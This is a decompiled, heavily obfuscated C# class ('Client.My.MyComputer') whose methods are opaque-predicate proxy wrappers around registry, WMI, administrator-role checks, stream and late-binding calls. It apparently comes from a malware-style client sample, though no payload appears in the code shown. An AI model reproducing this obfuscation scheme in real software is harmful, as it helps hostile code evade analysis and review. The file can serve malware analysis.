using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.IO;
using System.Management;
using System.Runtime.Serialization;
using System.Security.Principal;
using System.Text;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using Microsoft.Win32;
using ns0;

namespace Client.My;

[GeneratedCode("MyTemplate", "8.0.0.0")]
[EditorBrowsable(EditorBrowsableState.Never)]
internal sealed class MyComputer : Computer
{
	[EditorBrowsable(EditorBrowsableState.Never)]
	public MyComputer()
	{
	}

	static MyComputer()
	{
		MyApplication.smethod_0();
	}

	internal static void smethod_0<T>(T gparam_0, int int_0, char char_0)
	{
		int num = 0;
		switch (((char_0 ^ int_0) - 55) ^ 0)
		{
		case 0:
			Class11.smethod_0((object)gparam_0, 56, 80);
			break;
		}
		num++;
	}

	internal static Delegate smethod_1<T, U>(T gparam_0, U gparam_1, char char_0, int int_0) where T : Delegate where U : Delegate
	{
		int num = 0;
		Delegate result;
		int num2;
		do
		{
			result = (((int_0 ^ char_0) - 25) ^ num) switch
			{
				1 => Class11.Class15.smethod_1((Delegate)gparam_0, (Delegate)gparam_1, 'ˎ', 754), 
				0 => Class11.Class15.smethod_1((Delegate)gparam_0, (Delegate)gparam_1, 'ʔ', 687), 
				_ => null, 
			};
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static int smethod_2<T>(T gparam_0, byte[] byte_0, int int_0, int int_1, int int_2, int int_3) where T : Stream
	{
		int num = 0;
		int result = (((int_2 ^ int_3) - 27) ^ 0) switch
		{
			0 => Class11.smethod_5((Stream)gparam_0, byte_0, int_0, int_1, (short)52, (short)3), 
			_ => int_2, 
		};
		num++;
		return result;
	}

	internal static RegistryKey smethod_3<T>(T gparam_0, char char_0, short short_0) where T : RegistryProxy
	{
		int num = 0;
		RegistryKey result;
		int num2;
		do
		{
			result = (((short_0 ^ char_0) - 95) ^ num) switch
			{
				0 => (RegistryKey)(IDisposable)Class11.smethod_6<RegistryProxy>((RegistryProxy)(object)gparam_0, (short)589, 607), 
				_ => null, 
			};
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static bool smethod_4<T>(T gparam_0, int int_0, short short_0) where T : string
	{
		int num = 0;
		bool result;
		do
		{
			result = (((int_0 ^ short_0) - 77) ^ num) switch
			{
				1 => Class11.Class12.Class14.smethod_1((string)gparam_0, '\u001c', 55), 
				0 => Class11.Class12.Class14.smethod_1((string)gparam_0, 'X', 114), 
				_ => false, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static bool smethod_5<T>(T gparam_0, WindowsBuiltInRole windowsBuiltInRole_0, char char_0, int int_0) where T : WindowsPrincipal
	{
		int num = 0;
		bool result;
		do
		{
			result = (((char_0 ^ int_0) - 74) ^ num) switch
			{
				0 => Class11.Class12.Class14.smethod_2((WindowsPrincipal)gparam_0, windowsBuiltInRole_0, (short)158, 'Õ'), 
				_ => false, 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}

	internal static ComputerInfo smethod_6<T>(T gparam_0, short short_0, short short_1) where T : ServerComputer
	{
		int num = 0;
		ComputerInfo result;
		do
		{
			result = (ComputerInfo)((((short_1 ^ short_0) - 79) ^ num) switch
			{
				0 => Class11.Class12.Class14.smethod_4<ServerComputer>((ServerComputer)(object)gparam_0, 988, 'Ώ'), 
				_ => null, 
			});
			num++;
		}
		while ((short_1 * short_1 + short_1) % 2 != 0);
		return result;
	}

	internal static StringBuilder smethod_7<T>(T gparam_0, char char_0, short short_0, short short_1) where T : StringBuilder
	{
		int num = 0;
		StringBuilder result = (((short_1 ^ short_0) - 88) ^ 0) switch
		{
			0 => (StringBuilder)(ISerializable)Class16.smethod_0((StringBuilder)gparam_0, char_0, '\u035f', 'Ͷ'), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static string[] smethod_8<T>(T gparam_0, char[] char_0, int int_0, int int_1) where T : string
	{
		int num = 0;
		string[] result = (((int_1 ^ int_0) - 18) ^ 0) switch
		{
			0 => Class11.smethod_9((string)gparam_0, char_0, (short)659, 759), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_9<T, U>(T gparam_0, U gparam_1, bool bool_0, int int_0, char char_0) where T : RegistryKey where U : string
	{
		int num = 0;
		switch (((int_0 ^ char_0) - 72) ^ 0)
		{
		case 0:
			Class11.smethod_10((RegistryKey)gparam_0, (string)gparam_1, bool_0, (short)88, 73);
			break;
		}
		num++;
	}

	internal static object smethod_10<T, U>(bool bool_0, U gparam_0, T gparam_1, short short_0, short short_1)
	{
		int num = 0;
		object result = (((short_1 ^ short_0) - 81) ^ 0) switch
		{
			0 => Class11.Class12.smethod_2(bool_0, (object)gparam_0, (object)gparam_1, 252, (short)182), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static ManagementObjectCollection smethod_11<T>(T gparam_0, short short_0, char char_0) where T : ManagementObjectSearcher
	{
		int num = 0;
		ManagementObjectCollection result = (ManagementObjectCollection)((((short_0 ^ char_0) - 102) ^ 0) switch
		{
			0 => (IDisposable)Class11.smethod_13<ManagementObjectSearcher>((ManagementObjectSearcher)(object)gparam_0, (short)7, 18), 
			_ => null, 
		});
		num++;
		return result;
	}

	internal static object smethod_12<T, U, V>(V gparam_0, U gparam_1, T gparam_2, object[] object_0, string[] string_0, Type[] type_0, bool[] bool_0, bool bool_1, char char_0, short short_0) where T : string where U : Type
	{
		int num = 0;
		object result;
		do
		{
			result = (((short_0 ^ char_0) - 96) ^ num) switch
			{
				0 => Class16.smethod_6((object)gparam_0, (Type)gparam_1, (string)gparam_2, object_0, string_0, type_0, bool_0, bool_1, 790, 791), 
				_ => null, 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}
}
